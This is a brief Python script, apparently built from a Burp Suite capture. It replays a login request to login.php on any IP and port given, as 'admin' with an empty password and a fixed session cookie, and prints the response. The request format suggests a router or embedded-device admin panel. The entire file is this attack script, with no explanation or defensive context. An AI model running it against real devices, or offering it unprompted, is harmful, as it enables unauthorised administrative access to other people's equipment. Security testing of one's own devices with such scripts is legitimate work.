import argparse
import requests

def replay_login(ip, port):
    burp0_url = f"http://{ip}:{port}/login.php"
    burp0_cookies = {"session_uid": "hlkpqjmh"}
    burp0_headers = {
        "Cache-Control": "max-age=0",
        "Upgrade-Insecure-Requests": "1",
        "Origin": f"http://{ip}:{port}",
        "Content-Type": "application/x-www-form-urlencoded",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.5938.63 Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
        "Referer": f"http://{ip}:{port}/login.php",
        "Accept-Encoding": "gzip, deflate, br",
        "Accept-Language": "zh-CN,zh;q=0.9",
        "Connection": "close"
    }
    burp0_data = {
        "ACTION_POST": "LOGIN",
        "f_date": '',
        "f_time": '',
        "LOGIN_USER": "admin",
        "LOGIN_PASSWD": '',
        "login": " Login "
    }
    response = requests.post(burp0_url, headers=burp0_headers, cookies=burp0_cookies, data=burp0_data)
    print(response.status_code)
    print(response.text)

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Replay login script')
    parser.add_argument('--ip', required=True, help='Target IP address')
    parser.add_argument('--port', required=True, help='Target port')
    args = parser.parse_args()
    replay_login(args.ip, args.port)
